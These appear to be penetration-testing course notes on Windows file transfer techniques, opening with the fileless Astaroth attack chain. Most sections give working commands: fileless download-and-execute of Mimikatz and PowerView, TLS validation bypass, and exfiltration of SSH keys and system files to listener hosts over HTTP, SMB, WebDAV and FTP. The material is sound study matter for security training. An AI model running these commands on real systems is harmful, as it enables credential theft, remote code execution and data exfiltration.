# Astaroth Attack
- an example of a “fileless” attack
    
    - file was not “present” on the system, but ran in memory
    
- attack went like this:
    
    - malicious link from spear-phishing email that had an LNK file
    
    - when double-clicked, the LNK file exected the WMIC tool with the “/Format” parameter
    
    - then downloaded and executed malicious JavaScript code
    
    - downloads payloads by abusing the Bitsadmin tool
        
        - all payloads were base64 encoded and decoded using Certutil resulting in few DLL files
        
    
    - regsvr32 was used to load on the decoded DLLs, which decrypted and loaded other files until the final payload
    
![image 183.png](../assets/Windows%20File%20Transfer%20Methods/image%20183.png)
# Download Operations
## PowerShell Base64 Encode and Decode
- used when we dont want to download something
    
    - base64 encode a file and copy paste it into the other machine
    
- make sure the file stayed intact with md5sum
  
### Upload Base64 Encoded SSH Key
```JavaScript
md5sum id_rsa // use to verify integrity
cat id_rsa | base64 -w 0;echo // then copy this string
// in PowerShell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<string>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 // verify integrity
```
- may throw an error if the string is too long
  
## PowerShell Web Downloads
|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|
### PowerShell DownloadFile Method
```JavaScript
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
```JavaScript
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
  
### PowerShell DownloadString - Fileless Method
- download the payload and execute it directly
- run it in memory directly using the Invoke-Expression cmdlet or the alias IEX
- can also pipe it
```JavaScript
IEX (New-Object Net.WebClient).DownloadString('<url>')
```
```JavaScript
(New-Object Net.WebClient).DownloadString('<url>') | IEX
```
  
```JavaScript
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
```JavaScript
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
  
### Powershell Invoke-WebRequest
- noticeably slower at downloading files
- also has aliases iwr, curl, wget
```JavaScript
Invoke-WebRequest <url> -OutFile <outfile>
```
```JavaScript
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
```Markdown
iwr http://<IP>/<file>
```
- works just like wget
  
### Common Errors with PowerShell
- internet explorer launch configuration not completed (classic)
![image 1 137.png](../assets/Windows%20File%20Transfer%20Methods/image%201%20137.png)
- this can be bypassed using the parameter -UseBasicParsing
```JavaScript
Invoke-WebRequest https://<url> -UseBasicParsing | IEX
```
```JavaScript
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
  
- can also get problems with SSL/TLS if the certificate is not trusted
```JavaScript
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
```JavaScript
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
  
  
## SMB Downloads
### Create SMB Server
```JavaScript
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
- using /tmp/smbshare instead of ‘.’
    
    - probably better to get into that habit
    
```JavaScript
[!bash!]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
  
### Copy File from SMB Server
```JavaScript
copy \\<IP>\<share>\<file>
```
- new versions of Windows block unauthenticated guest access
  
### Create SMB Server with Username and Password
```JavaScript
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
```JavaScript
[!bash!]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
  
### Mount the SMB Server with Username and Password
```JavaScript
net use n: \\<IP>\<share> /user:<user> <pass>
copy n:\<file>
```
  
## FTP Downloads
### Setting up Python3 FTP Server
```JavaScript
sudo python3 -m pyftpdlib --port 21
```
### Transferring File from an FTP Server Using PowerShell
```JavaScript
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', 'C:\Users\Public\<file>')
```
  
### No Interactive Shell? - Create a Command File for the FTP Client and Download Target File
- sometimes you won’t have an interactive shell, so you can create an FTP command file to download a file
- run below line by line
```JavaScript
C:\htb> echo open <IP> > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open <IP>
Log in with USER and PASS first.
ftp> USER anonymous
ftp> GET file.txt
ftp> bye
C:\htb>more file.txt
This is a test file
```
  
```JavaScript
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous
ftp> GET file.txt
ftp> bye
C:\htb>more file.txt
This is a test file
```
  
# Upload Operations
- can use the same process for uploading files as well
  
## PowerShell Base64 Encode and Decode
### Encode File Using PowerShell
```JavaScript
[Convert]::ToBase64String((Get-Content -path "C:\<path>" -Encoding byte))
Get-FileHash "C:\<path>" -Algorithm MD5 | select Hash
```
  
```JavaScript
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
Hash
----
3688374325B992DEF12793500307566D
```
  
### Decode Base64 String in Linux
```JavaScript
echo '<string>' | base64 -d > <output_file>
md5sum <output_file>
```
  
  
## PowerShell Web Uploads
- doesn’t have built-in function for uploads, but we can use Invoke-WebRequest and Invoke-RestMethod to build our own
  
### Installing a Configured WebServer with Upload
- can use uploadserver in Python on our linux host
```JavaScript
pip3 install uploadserver
python3 -m uploadserver
```
  
### PowerShell Script to Upload a File to Python Upload Server
```JavaScript
// Download PowerShell Module to upload
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
// Upload file
Invoke-FileUpload -Uri http://<IP>:<port>/upload -File C:\<path>
```
```JavaScript
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
  
  
## PowerShell Base64 Web Upload
- encode files for upload operations using Invoke-WebRequest and Invoke-RestMethod
```JavaScript
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\<path>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:<port>/ -Method POST -Body $b64
```
```JavaScript
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
  
- then catch the base64 string with netcat and decode it
```JavaScript
nc -lvnp <port>
echo '<string>' | base64 -d -w 0 > <output_file>
```
```JavaScript
[!bash!]$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive
IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...

[!bash!]$ echo <base64> | base64 -d -w 0 > hosts
```
  
## SMB Uploads
- most companies don’t allow SMB traffic out of their internal network
- alternative is to run SMB over HTTP with WebDav.WebDAV
    
    - SMB will first try to connect using SMB protocol, but if no shares are found it will try over HTTP
    
  
### Configuring WebDav Server
```JavaScript
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
  
### Connecting to the Webdav Share
```JavaScript
dir \\<IP>\DavWWWRoot
```
  
### Upload Files using SMB
```JavaScript
copy C:\<path> \\<IP>\DavWWWRoot\ // over HTTP
copy C:\<path> \\<IP>\sharefolder\ // over SMB
```
  
## FTP Uploads
### Server Setup
```JavaScript
sudo python3 -m pyftpdlib --port 21 --write
```
  
### PowerShell Upload File
```JavaScript
(New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', 'C:\<path>')
```
```JavaScript
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
  
### Create a Command File for the FTP Client to Upload a File
```JavaScript
C:\htb> echo open <IP> > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\<path> >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open <IP>
Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\<path>
ftp> bye
```
```JavaScript
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```